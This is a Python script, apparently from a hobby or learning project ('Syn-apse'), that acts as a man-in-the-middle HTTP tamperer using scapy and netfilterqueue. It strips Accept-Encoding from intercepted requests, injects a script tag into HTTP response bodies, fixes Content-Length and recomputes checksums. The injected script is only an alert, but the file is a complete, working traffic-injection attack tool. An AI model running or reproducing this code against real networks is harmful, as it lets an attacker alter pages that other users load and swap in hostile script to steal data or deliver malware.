import scapy.all as scapy
import traceback # Import the traceback module for detailed errors
import netfilterqueue

import re

INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            load = scapy_packet[scapy.Raw].load
            modified = False
            
            # Strip Accept-Encoding from requests
            if scapy_packet[scapy.TCP].dport == 80:
                print("[HTTP] Intercepted HTTP Request")
                load_str = load.decode('latin-1', errors='ignore')
                # Fix the regex pattern
                modified_load_str = re.sub(r"Accept-Encoding:.*?\r\n", "", load_str, flags=re.IGNORECASE)
                modified_load = modified_load_str.encode('latin-1')
                
                if modified_load != load:
                    print("[HTTP] Stripped Accept-Encoding header")
                    scapy_packet[scapy.Raw].load = modified_load
                    modified = True
                    
            # Inject JavaScript into responses  
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[HTTP] Intercepted HTTP Response")
                if b"</body>" in load:
                    print("[HTTP] Injecting JavaScript...")
                    
                    # Update Content-Length header
                    load_str = load.decode('latin-1', errors='ignore')
                    if "Content-Length:" in load_str:
                        # Extract current content length
                        content_length_match = re.search(r"Content-Length:\s*(\d+)", load_str)
                        if content_length_match:
                            old_length = int(content_length_match.group(1))
                            new_length = old_length + len(INJECTION_SCRIPT)
                            load_str = re.sub(r"Content-Length:\s*\d+", f"Content-Length: {new_length}", load_str)
                    
                    # Inject the script
                    modified_load = load_str.replace("</body>", INJECTION_SCRIPT.decode('latin-1') + "</body>").encode('latin-1')
                    scapy_packet[scapy.Raw].load = modified_load
                    modified = True
                    
            # Recalculate checksums if modified
            if modified:
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum  
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))
                
    except Exception:
        print("[HTTP] Packet processing error")
        traceback.print_exc()
    
    packet.accept()


def start():
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    print("[HTTP] Packet modifier started. Waiting for traffic...")
    try:
        queue.run()
    except KeyboardInterrupt:
        print("\n[HTTP] Shutting down packet modifier.")
        queue.unbind()
